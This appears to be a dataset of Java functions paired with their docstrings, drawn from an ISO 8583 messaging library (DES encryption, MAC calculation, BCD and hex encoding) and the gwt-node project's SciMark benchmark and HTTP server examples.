{"docstring": "/**\n * \n * \u5c06ASC\u5b57\u7b26\u4e32\u8f6c\ufffd?6\u8fdb\u5236\u5b57\u7b26\ufffd?\n * \n * @param asc\n * \n * @return\n */\n", "func_signal": "protected static  String ASC_2_HEX(String asc)", "code": "{\n\tStringBuffer hex = new StringBuffer();\n\ttry {\n\t\tbyte[] bs = asc.toUpperCase().getBytes(\"UTF-8\");\n\t\tfor (byte b : bs) {\n\t\t\thex.append(Integer.toHexString(new Byte(b).intValue()));\n\t\t}\n\t} catch (UnsupportedEncodingException e) {\n\t\te.printStackTrace();\n\t}\n\treturn hex.toString();\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u5c06\u5bc6\u94a5\u5faa\u73af\u5de6\u79fbi\ufffd?\n * \n * @param source\n *            \u4e8c\u8fdb\u5236\u5bc6\u94a5\u6570\ufffd?\n * \n * @param i\n *            \u5faa\u73af\u5de6\u79fb\u4f4d\u6570\n * \n * @return\n */\n", "func_signal": "protected static  int[] keyLeftMove(int[] source, int i)", "code": "{\n\tint temp = 0;\n\tint len = source.length;\n\tint ls = LS[i];\n\t// System.out.println(\"len\" + len + \",LS[\" + i + \"]=\" + ls);\n\tfor (int k = 0; k < ls; k++) {\n\t\ttemp = source[0];\n\t\tfor (int j = 0; j < len - 1; j++) {\n\t\t\tsource[j] = source[j + 1];\n\t\t}\n\t\tsource[len - 1] = temp;\n\t}\n\treturn source;\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u5355\ufffd?\u957f\u5bc6\u94a5DES(16byte)\n * \n * @param source\n * \n * @param key\n * \n * @param type\n *            0:encrypt 1:discrypt\n * \n * @return\n */\n", "func_signal": "protected static  String DES_1(String source, String key, int type)", "code": "{\n\tif (source.length() != 16 || key.length() != 16)\n\t\treturn null;\n\tif (type == 0) {\n\t\treturn encryption(source, key);\n\t}\n\tif (type == 1) {\n\t\treturn discryption(source, key);\n\t}\n\treturn null;\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \u5c06byte\u6570\u7ec4\u8f6c\u5316\u4e3aString\u7c7b\u578b\u7684\u5341\u516d\u8fdb\u5236\u7f16\u7801\u683c\u5f0f\n * \u672c\u65b9\u6cd5\u5b9e\u73b0\u7684\u601d\u8def\u662f\uff1a\n * 1\uff09\u6bcf\u4f4dbyte\u6570\u7ec4\u8f6c\u6362\u4e3a2\u4f4d\u7684\u5341\u516d\u8fdb\u5236\u6570\n * 2\uff09\u5c06\u5b57\u8282\u5de6\u79fb4\u4f4d\u53d6\u5f97\u9ad8\u56db\u4f4d\u5b57\u8282\u6570\u503c\uff0c\u83b7\u53d6\u5bf9\u5e94\u7684char\u7c7b\u578b\u6570\u7ec4\u7f16\u7801\n * 3\uff09\u5c06\u5b57\u8282\u4e0e0x0F\u6309\u4f4d\u4e0e\uff0c\u4ece\u800c\u83b7\u53d6\u7b2c\u56db\u4f4d\u7684\u5b57\u8282\uff0c\u540c\u6837\u83b7\u53d6\u7f16\u7801\n */\n", "func_signal": "public static String hex(byte[] bParam)", "code": "{\n    StringBuilder accum = new StringBuilder();\n    for(byte bt:bParam){\n         accum.append(HEX[bt>>4&0x0F]);//&0x0F\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u8f6c\u6362\u8d1f\u6570\n         accum.append(HEX[bt&0x0F]);\n    }\n    return accum.toString();\n}", "path": "com\\simple8583\\util\\EncodeUtil.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "//\u91cd\u5199MAC\u6821\u9a8c\u65b9\u6cd5\uff0c\u9a8c\u8bc1\u5931\u8d25\u5219\u629b\u51fa\u8fd0\u884c\u65f6\u5f02\u5e38\n", "func_signal": "@Override\nprotected void macValidate(IsoPackage isoPackage, Map<String, String> map)", "code": "{\n\tString mac = null;\n\ttry {\n\t\tmac =  EncodeUtil.hex(mac(isoPackage));\n\t} catch (Exception e) {\n\t\te.printStackTrace();\n\t}\n\tString returnMac = EncodeUtil.hex(EncodeUtil.binary(map.get(\"64\")));//Binary\u7f16\u7801\u8f6c\u6362\u4e3ahex\u7f16\u7801\n\tif(!(mac.substring(0,8).equals(returnMac.substring(0,8)))){\n\t\tthrow new RuntimeException(\"MAC\u6821\u9a8c\u5931\u8d25\uff0c\u8fd4\u56de\u503c\"+returnMac+\",\u8ba1\u7b97\u503c\"+mac);\n\t}\n}", "path": "com\\simple8583\\factory\\IsoMsgFactory.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \ufffd?6\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u6210ASC\u7684\u5b57\u7b26\u4e32\n * \n * \ufffd?6\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u538b\u7f29\u6210BCD\ufffd?30313233343536373839414243444546)-->(0123456789ABCDEF)\n * \n * @param hex\n * \n * @return\n */\n", "func_signal": "protected static  String HEX_2_ASC(String hex)", "code": "{\n\tString asc = null;\n\tint len = hex.length();\n\tbyte[] bs = new byte[len / 2];\n\tfor (int i = 0; i < len / 2; i++) {\n\t\tbs[i] = Byte.parseByte(hex.substring(i * 2, i * 2 + 2), 16);\n\t}\n\ttry {\n\t\tasc = new String(bs, \"UTF-8\");\n\t} catch (UnsupportedEncodingException e) {\n\t\te.printStackTrace();\n\t}\n\treturn asc;\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "//\u5224\u65ad\u5b57\u7b26\u4e32\u662f\u5426\u90fd\u662f\u7531\u6570\u5b57\u7ec4\u6210\n", "func_signal": "public static boolean isNumeric(String str)", "code": "{\n\tif(str==null){\n\t\treturn false;\n\t}\n   Pattern pattern = Pattern.compile(\"[0-9]*\"); \n   Matcher isNum = pattern.matcher(str);\n   if( !isNum.matches() ){\n       return false; \n   } \n   return true; \n}", "path": "com\\simple8583\\util\\SimpleUtil.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u5c06s1\u548cs2\u505a\u5f02\u6216\uff0c\u7136\u540e\u8fd4\u56de\n * \n * @param s1\n * \n * @param s2\n * \n * @return\n */\n", "func_signal": "protected static  String xOr(String s1, String s2)", "code": "{\n\tint[] iArr = diffOr(string2Binary(s1), string2Binary(s2));\n\treturn binary2ASC(intArr2Str(iArr));\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "//\u6839\u636e\u8fd4\u56de\u7684bit\u503c\n", "func_signal": "public static BitMap addBits(byte[] bits)", "code": "{\n\tBitMap bitMap = new BitMap(bits.length*8);\n\tint pointer=0;\n\tfor(byte bt:bits){\n\t\tfor(int pos=7;pos>=0;pos--){\n\t\t\t//\u5224\u65ad\u8be5\u4f4d\u662f\u5426\u4e3a0\n\t\t\tif((int)(bt>>>pos&0x01)==1){\n\t\t\t\tbitMap.addBit(pointer);\n\t\t\t}\n\t\t\tpointer++;\n\t\t}\n\t}\n\treturn bitMap;\n}", "path": "com\\simple8583\\model\\BitMap.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u8ba1\u7b97MAC(hex)\n * \n * ANSI-X9.9-MAC(16\u7684\u6574\u6570\ufffd?\u4e0d\u8865)\n * \n * PBOC-DES-MAC(16\u7684\u6574\u6570\ufffd?\ufffd?000000000000000)\n * \n * \u4f7f\u7528\u5355\ufffd?\u957f\u5bc6\u94a5DES\u7b97\u6cd5\n * \n * @param key\u5bc6\u94a5\n *            (16byte)\n * \n * @param vector\u521d\u59cb\u5411\u91cf0000000000000000\n * \n * @param data\u6570\u636e\n * \n * @return mac\n */\n", "func_signal": "protected static  String MAC(String key, String vector, String data, int type)", "code": "{\n\tif (type == ASC) {\n\t\tdata = ASC_2_HEX(data);\n\t}\n\tint len = data.length();\n\tint arrLen = len / 16 + 1;\n\tString[] D = new String[arrLen];\n\tif (vector == null)\n\t\tvector = \"0000000000000000\";\n\tif (len % 16 == 0) {\n\t\tdata += \"8000000000000000\";\n\t} else {\n\t\tdata += \"80\";\n\t\tfor (int i = 0; i < 15 - len % 16; i++) {\n\t\t\tdata += \"00\";\n\t\t}\n\t}\n\tfor (int i = 0; i < arrLen; i++) {\n\t\tD[i] = data.substring(i * 16, i * 16 + 16);\n\t\tSystem.out.println(\"D[\" + i + \"]=\" + D[i]);\n\t}\n\t// D0 Xor Vector\n\tString I = xOr(D[0], vector);\n\tString O = null;\n\tfor (int i = 1; i < arrLen; i++) {\n\t\t// System.out.println(i + \"**************\");\n\t\t// System.out.println(\"I=\" + I);\n\t\tO = DES_1(I, key, 0);\n\t\t// System.out.println(\"O=\" + O);\n\t\tI = xOr(D[i], O);\n\t// System.out.println(\"I=\" + I);\n\t}\n\tI = DES_1(I, key, 0);\n\treturn I;\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * @param R\n *            (\ufffd?2bit)\n * \n * @param K\n *            (48bit\u7684\u8f6e\u5b50\u5bc6\ufffd?\n * \n * @return 32bit\n */\n", "func_signal": "protected static  int[] f(int[] R, int[] K)", "code": "{\n\tint[] dest = new int[32];\n\tint[] temp = new int[48];\n\t// \u5148\u5c06\u8f93\u516532bit\u6269\u5c55\ufffd?8bit\n\tint[] expendR = expend(R);// 48bit\n\t// \u4e0e\u8f6e\u5b50\u5bc6\u94a5\u8fdb\u884c\u5f02\u6216\u8fd0\ufffd?\n\ttemp = diffOr(expendR, K);\n\t// \u538b\u7f29\ufffd?2bit\n\tdest = press(temp);\n\t// System.out.println(\"need press data----->\");\n\t// printArr(temp);\n\treturn dest;\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "// \u83b7\u53d6\u672c\u57df\u7684IsoType\n", "func_signal": "public IsoType getIsoType()", "code": "{\n\tif (this.isoType == null) {\n\t\tthis.isoType = IsoType.valueOf(this.type);\n\t}\n\treturn isoType;\n}", "path": "com\\simple8583\\model\\IsoField.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * \n * \u4e09\u91cdDES\u7b97\u6cd5(\u53cc\ufffd?\u957f\u5bc6\ufffd?32byte))\n * \n * \u5bc6\u94a5K1\u548cK2\n * \n * 1\u3001\u5148\u7528K1\u52a0\u5bc6\u660e\u6587\n * \n * 2\u3001\u63a5\ufffd?\ufffd\ufffdK2\u5bf9\u4e0a\ufffd?\ufffd\ufffd\u7684\u7ed3\u679c\u8fdb\u884c\u89e3\ufffd?\n * \n * 3\u3001\u7136\u540e\u7528K1\u5bf9\u4e0a\ufffd?\ufffd\ufffd\u7684\u7ed3\u679c\u8fdb\u884c\u52a0\ufffd?\n * \n * @param source\n * \n * @param key\n * \n * @param type\n *            0:encrypt 1:discrypt\n * \n * @return\n */\n", "func_signal": "protected static  String DES_3(String source, String key, int type)", "code": "{\n\tif (key.length() != 32 || source.length() != 16)\n\t\treturn null;\n\tString temp = null;\n\tString K1 = key.substring(0, key.length() / 2);\n\tString K2 = key.substring(key.length() / 2);\n\tSystem.out.println(\"K1--->\" + K1);\n\tSystem.out.println(\"K2--->\" + K2);\n\tif (type == 0) {\n\t\ttemp = encryption(source, K1);\n\t\tSystem.out.println(\"step1--->\" + temp);\n\t\ttemp = discryption(temp, K2);\n\t\tSystem.out.println(\"step2--->\" + temp);\n\t\treturn encryption(temp, K1);\n\t}\n\tif (type == 1) {\n\t\ttemp = discryption(source, K1);\n\t\ttemp = encryption(temp, K2);\n\t\treturn discryption(temp, K1);\n\t}\n\treturn null;\n}", "path": "com\\simple8583\\util\\encrypt\\DES.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**\n * @param code\n * @param length\n * @return\n */\n", "func_signal": "public static byte[] bcd(String code,int length)", "code": "{\n    if(length<0){\n        throw new IllegalArgumentException(\"\u53c2\u6570length\u4e0d\u80fd\u5c0f\u4e8e0,length:\"+length);\n    }else if(length==0){\n        return new byte[0];\n    }\n    byte[] bt = new byte[length];\n    //\u6307\u793a\u5f53\u524d\u4f4d\u7f6e\n    int point = 0;\n    if(code.length()<2*length){\n    \tcode = addBlankLeft(code,2*length-code.length(),\"0\");\n    }\n    \n    //\u6bcf\u4e24\u4f4d\u5408\u5e76\u4e3a\u4e00\u4e2a\u5b57\u8282\n    for(;point<code.length();point+=2){\n        //(point+1)/2\u8ba1\u7b97\u5f53\u524d\u6307\u5411\u7684\u503c\n        //Character.digit\u5c06\u5bf9\u5e94\u7684Char\u8f6c\u4e3a\u6570\u5b57\uff0c\u5982'8'-> 8\n        //<<4\u5de6\u79fb\u56db\u4f4d\uff1a\u5373\u4e3a\u2192_\u2192\uff08\u53f3\u8fb9\uff09\u7684\u6570\u5b57\u8ba9\u5f00\u4f4d\u7f6e\n        bt[(point+1)/2] = (byte)(Character.digit(code.charAt(point),16)<<4|Character.digit(code.charAt(point+1),16));\n    }\n    return bt;\n}", "path": "com\\simple8583\\util\\EncodeUtil.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "//\u4f20\u5165\u53c2\u6570\u4e3a\u53ea\u670901\u7684\u5b57\u7b26\u4e32\n", "func_signal": "public static byte[] binary(String binaryStr)", "code": "{\n    //\u957f\u5ea6\u4e0d\u662f8\u500d\u6570\u7684\u8bdd\uff0c\u65e0\u6cd5\u77e5\u9053\u5728\u5de6\u8fb9\u6216\u53f3\u8fb9\u8865\u96f6\uff0c\u4f1a\u5f15\u8d77\u6b67\u4e49\uff0c\u5bfc\u81f4\u7ed3\u679c\u4e0d\u6b63\u786e\n    if(binaryStr.length()%8!=0){\n        throw new IllegalArgumentException(\"\u4f20\u5165\u7684\u53c2\u6570\u957f\u5ea6\u5fc5\u987b\u662f8\u7684\u500d\u6570\");\n    }\n    StringBuffer accum = new StringBuffer();\n    for(int i=0;i<binaryStr.length();i+=4){\n        String temp = binaryStr.substring(i,i+4);\n        int value=0;\n        for(int j=0;j<4;j++){\n            if(temp.charAt(j)=='1'){\n                value+=Math.pow(2, 3 - j);//\u8ba1\u7b97\u503c\n            }\n        }\n        accum.append(HEX[value]);\n    }\n    return bcd(accum.toString());\n}", "path": "com\\simple8583\\util\\EncodeUtil.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/**BCD\u7f16\u7801(8421\u7801)\u4e3a\u4e00\u4e2a4\u4f4d\u8868\u793a\u4e00\u4e2a10\u8fdb\u5236\u6570\uff0c\u5373\u6bcf\u4e2a\u5b57\u8282\u8868\u793a\u4e24\u4e2a\u6570\n*\u672c\u65b9\u6cd5\u4e2d\u7684code\u4e3a10\u8fdb\u5236\u6570\uff08\u672c\u65b9\u6cd5\u652f\u630116\u8fdb\u5236\u6570\u7f16\u7801\uff0c\u6bcf\u4e24\u4f4d\u7f16\u4e3a1\u5b57\u8282\uff09\n*/\n", "func_signal": "public static byte[] bcd(String code)", "code": "{\n    //\u63a7\u5236byte\u6570\u7ec4\u7684\u5927\u5c0f\n    int len = code.length()%2==0?code.length()/2:code.length()/2+1;\n    return bcd(code,len);\n}", "path": "com\\simple8583\\util\\EncodeUtil.java", "repo_name": "magicjoey/Simple8583", "stars": 65, "license": "None", "language": "java", "size": 229}
{"docstring": "/** \n\tResume timing, after stopping.  (Does not wipe out\n\t\taccumulated times.)\n\n*/\n", "func_signal": "public  void resume()", "code": "{ \n\t\tif (!running)\n\t\t{\n\t\t\tlast_time = seconds(); \n\t\t\trunning = true;\n\t\t}\n\t}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Stopwatch.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/* multiple iterations used to make kernel have roughly\n\tsame granulairty as other Scimark kernels. */\n", "func_signal": "public static double num_flops(int N, int nz, int num_iterations)", "code": "{\n\t/* Note that if nz does not divide N evenly, then the\n\t   actual number of nonzeros used is adjusted slightly.\n\t*/\n\tint actual_nz = (nz/N) * N;\n\treturn ((double)actual_nz) * 2.0 * ((double) num_iterations);\n}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\SparseCompRow.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n * Get the argument from the given list that immediately\n * follows the name given. Returns null if not found.\n * \n * @param argList\n * @param argName\n * @return\n */\n", "func_signal": "private static String getArg(List<String> argList, String argName)", "code": "{\n    int index = argList.indexOf(argName);\n    if (index != -1 && index < argList.size() - 1) {\n        return argList.get(index + 1);\n    }\n    return null;\n}", "path": "examples\\http-server\\src\\org\\gwtnode\\examples\\httpserver\\HttpServer.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/** \n\tStop timer\n\n*/\n", "func_signal": "public  double stop()", "code": "{ \n\t\tif (running) \n        {\n\t\t\ttotal += seconds() - last_time; \n            running = false;\n        }\n        return total; \n    }", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Stopwatch.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n   Initializes a sequence of uniformly distributed quasi random numbers\n   with a given seed on a given half-open interval [left,right).\n\n@param <B>seed</B> (int)<BR>\n\n       The seed of the random number generator.  Two sequences with the same\n       seed will be identical.\n\n@param <B>left</B> (double)<BR>\n\n       The left endpoint of the half-open interval [left,right).\n\n@param <B>right</B> (double)<BR>\n\n       The right endpoint of the half-open interval [left,right).\n*/\n", "func_signal": "public Random (int seed, double left, double right)", "code": "{\n    initialize( seed);\n    this.left = left;\n    this.right = right;\n    width = right - left;\n    haveRange = true;\n  }", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Random.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n * Get the argument from the given list that immediately\n * follows the name given. Returns null if not found.\n * \n * @param argList\n * @param argName\n * @return\n */\n", "func_signal": "private static String getArg(List<String> argList, String argName)", "code": "{\n    int index = argList.indexOf(argName);\n    if (index != -1 && index < argList.size() - 1) {\n        return argList.get(index + 1);\n    }\n    return null;\n}", "path": "examples\\oophm-proxy\\src\\org\\gwtnode\\examples\\oophmproxy\\OophmProxy.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n   Initializes a sequence of uniformly distributed quasi random numbers on a\n   given half-open interval [left,right) with a seed based on the system\n   clock.\n\n@param <B>left</B> (double)<BR>\n\n       The left endpoint of the half-open interval [left,right).\n\n@param <B>right</B> (double)<BR>\n\n       The right endpoint of the half-open interval [left,right).\n*/\n", "func_signal": "public Random ( double left, double right)", "code": "{\n    initialize( (int) System.currentTimeMillis() );\n    this.left = left;\n    this.right = right;\n    width = right - left;\n    haveRange = true;\n  }", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Random.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/** \n\tStart (and reset) timer\n\n*/\n", "func_signal": "public  void start()", "code": "{ \n\t\tif (!running)\n\t\t{\n\t\t\trunning = true;\n\t\t\ttotal = 0.0;\n\t\t\tlast_time = seconds(); \n\t\t}\n\t}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Stopwatch.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n * Log the given request\n * \n * @param request\n */\n", "func_signal": "private static void logRequest(ServerRequest request)", "code": "{\n    StringBuilder builder = new StringBuilder(\"New Request:\\n\");\n    builder.append(\"Method: \").append(request.method()).append('\\n').\n            append(\"URL: \").append(request.url()).append('\\n').\n            append(\"HTTP Version: \").append(request.httpVersion()).append('\\n').\n            append(\"Headers:\\n\");\n    for (Entry<String, String> header : request.headerMap().entrySet()) {\n        builder.append(\"  \").append(header.getKey()).append(\" : \").\n                append(header.getValue()).append('\\n');\n    }\n    Util.get().log(builder.toString());\n}", "path": "examples\\http-server\\src\\org\\gwtnode\\examples\\httpserver\\HttpServerListener.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n   Returns the next random number in the sequence.\n*/\n", "func_signal": "public final synchronized double nextDouble ()", "code": "{\n\n    int k;\n    double nextValue;\n\n    k = m[i] - m[j];\n    if (k < 0) k += m1;\n    m[j] = k;\n\n    if (i == 0) \n\t\ti = 16;\n\telse i--;\n\n    if (j == 0) \n\t\tj = 16 ;\n\telse j--;\n\n    if (haveRange) \n\t\treturn  left +  dm1 * (double) k * width;\n\telse\n\t\treturn dm1 * (double) k;\n\n  }", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Random.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/* computes  a matrix-vector multiply with a sparse matrix\n\theld in compress-row format.  If the size of the matrix\n\tin MxN with nz nonzeros, then the val[] is the nz nonzeros,\n\twith its ith entry in column col[i].  The integer vector row[]\n\tis of size M+1 and row[i] points to the begining of the\n\tith row in col[].  \n*/\n", "func_signal": "public static void matmult( double y[], double val[], int row[],\n\tint col[], double x[], int NUM_ITERATIONS)", "code": "{\n\tint M = row.length - 1;\n\n\tfor (int reps=0; reps<NUM_ITERATIONS; reps++)\n\t{\n\t\n\t\tfor (int r=0; r<M; r++)\n\t\t{\n\t\t\tdouble sum = 0.0; \n\t\t\tint rowR = row[r];\n\t\t\tint rowRp1 = row[r+1];\n\t\t\tfor (int i=rowR; i<rowRp1; i++)\n\t\t\t\tsum += x[ col[i] ] * val[i];\n\t\t\ty[r] = sum;\n\t\t}\n\t}\n}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\SparseCompRow.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/**\n * Annotation defining a gwt-node object\n *\n * @author Chad Retz\n */\n", "func_signal": "@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.TYPE)\n@Documented\npublic @interface GwtNodeObject", "code": "{\n\n    /**\n     * The name of the object in node.js. If not present, this is\n     * the class's name.\n     * \n     * @return\n     */\n    String value() default \"\";\n    \n    /**\n     * The name of the module this object belongs to. If not present,\n     * this assumes it is whatever module is found in the current\n     * package. If there are multiple modules in the current package\n     * or no modules in the current package, this defaults to the\n     * global module.\n     * \n     * @return\n     */\n    String module() default \"\";\n}", "path": "src\\org\\gwtnode\\core\\meta\\GwtNodeObject.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/* Benchmark 5 kernels with individual Mflops.\n\t \"results[0]\" has the average Mflop rate.\n\n*/\n", "func_signal": "public static void main(String args[])", "code": "{\n\t\t// default to the (small) cache-contained version\n\n\t\tdouble min_time = Constants.RESOLUTION_DEFAULT;\n\n\t\tint FFT_size = Constants.FFT_SIZE;\n\t\tint SOR_size =  Constants.SOR_SIZE;\n\t\tint Sparse_size_M = Constants.SPARSE_SIZE_M;\n\t\tint Sparse_size_nz = Constants.SPARSE_SIZE_nz;\n\t\tint LU_size = Constants.LU_SIZE;\n\n\t\t// look for runtime options\n\n      if (args.length > 0)\n      {\n\n\t\t\tif (args[0].equalsIgnoreCase(\"-h\") || \n\t\t\t\t\t\targs[0].equalsIgnoreCase(\"-help\"))\n\t\t\t{\n\t\t\t\tProcess.get().stdout().write(\"Usage: [-large] [minimum_time]\\n\");\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t\tint current_arg = 0;\n\t\t\tif (args[current_arg].equalsIgnoreCase(\"-large\"))\n\t\t\t{\n\t\t\t\tFFT_size = Constants.LG_FFT_SIZE;\n\t\t\t\tSOR_size =  Constants.LG_SOR_SIZE;\n\t\t\t\tSparse_size_M = Constants.LG_SPARSE_SIZE_M;\n\t\t\t\tSparse_size_nz = Constants.LG_SPARSE_SIZE_nz;\n\t\t\t\tLU_size = Constants.LG_LU_SIZE;\n\n\t\t\t\tcurrent_arg++;\n\t\t\t}\n\n\t\t\tif (args.length > current_arg)\n      \t\tmin_time = Double.valueOf(args[current_arg]).doubleValue();\n      }\n      \n\n\t\t// run the benchmark\n\n\t\tdouble res[] = new double[6];\n\t\tRandom R = new Random(Constants.RANDOM_SEED);\n\n\t\tres[1] = kernel.measureFFT( FFT_size, min_time, R);\n\t\tres[2] = kernel.measureSOR( SOR_size, min_time, R);\n\t\tres[3] = kernel.measureMonteCarlo(min_time, R);\n\t\tres[4] = kernel.measureSparseMatmult( Sparse_size_M, \n\t\t\t\t\tSparse_size_nz, min_time, R);\n\t\tres[5] = kernel.measureLU( LU_size, min_time, R);\n\n\n\t\tres[0] = (res[1] + res[2] + res[3] + res[4] + res[5]) / 5;\n\n\n\t    // print out results\n\n\t\tProcess.get().stdout().write(\"\\n\");\n\t\tProcess.get().stdout().write(\"SciMark 2.0a\\n\");\n\t\tProcess.get().stdout().write(\"\\n\");\n\t\tProcess.get().stdout().write(\"Composite Score: \" + res[0] + \"\\n\");\n\t\tProcess.get().stdout().write(\"FFT (\"+FFT_size+\"): \");\n\t\tif (res[1]==0.0)\n\t\t    Process.get().stdout().write(\" ERROR, INVALID NUMERICAL RESULT!\\n\");\n\t\telse\n\t\t    Process.get().stdout().write(res[1] + \"\\n\");\n\n\t\tProcess.get().stdout().write(\"SOR (\"+SOR_size+\"x\"+ SOR_size+\"): \"\n\t\t\t\t+ \"  \" + res[2] + \"\\n\");\n\t\tProcess.get().stdout().write(\"Monte Carlo : \" + res[3] + \"\\n\");\n\t\tProcess.get().stdout().write(\"Sparse matmult (N=\"+ Sparse_size_M+ \n\t\t\t\t\", nz=\" + Sparse_size_nz + \"): \" + res[4] + \"\\n\");\n\t\tProcess.get().stdout().write(\"LU (\" + LU_size + \"x\" + LU_size + \"): \");\n\t\tif (res[5]==0.0)\n\t\t    Process.get().stdout().write(\" ERROR, INVALID NUMERICAL RESULT!\\n\");\n\t\telse\n\t\t    Process.get().stdout().write(res[5] + \"\\n\");\n\n\t\t// print out System info\n\t\tProcess.get().stdout().write(\"\\n\");\n\t\tProcess.get().stdout().write(\"java.vendor: Google Web Toolkit\\n\");\n\t\tProcess.get().stdout().write(\"java.version: ?\\n\");\n\t\tProcess.get().stdout().write(\"os.arch: js\\n\");\n\t\tProcess.get().stdout().write(\"os.name: node.js\\n\");\n\t\tProcess.get().stdout().write(\"os.version: \" +\n\t\t        Process.get().version() + \"\\n\");\n\n\n\t}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\commandline.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/** \n\tReturn system time (in seconds)\n\n*/\n", "func_signal": "public void reset()", "code": "{ \n\t\trunning = false; \n\t\tlast_time = 0.0; \n\t\ttotal=0.0; \n\t}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\Stopwatch.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "/** Make a random array of n (complex) elements. */\n", "func_signal": "public static double[] makeRandom(int n)", "code": "{\n  int nd = 2*n;\n  double data[] = new double[nd];\n  for(int i=0; i<nd; i++)\n    data[i]= Math.random();\n  return data; }", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\FFT.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
{"docstring": "// each measurement returns approx Mflops\n", "func_signal": "public static double measureFFT(int N, double mintime, Random R)", "code": "{\n\t// initialize FFT data as complex (N real/img pairs)\n\n\tdouble x[] = RandomVector(2*N, R);\n\tdouble oldx[] = NewVectorCopy(x);\n\tlong cycles = 1;\n\tStopwatch Q = new Stopwatch();\n\n\twhile(true)\n\t{\n\t\tQ.start();\n\t\tfor (int i=0; i<cycles; i++)\n\t\t{\n\t\t\tFFT.transform(x);\t// forward transform\n\t\t\tFFT.inverse(x);\t\t// backward transform\n\t\t}\n\t\tQ.stop();\n\t\tif (Q.read() >= mintime)\n\t\t\tbreak;\n\n\t\tcycles *= 2;\n\t}\n\t// approx Mflops\n\n\tfinal double EPS = 1.0e-10;\n\tif ( FFT.test(x) / N > EPS )\n\t\treturn 0.0;\n\t\n\treturn FFT.num_flops(N)*cycles/ Q.read() * 1.0e-6;\n}", "path": "examples\\scimark\\src\\org\\gwtnode\\examples\\scimark\\impl\\kernel.java", "repo_name": "cretz/gwt-node", "stars": 87, "license": "apache-2.0", "language": "java", "size": 51859}
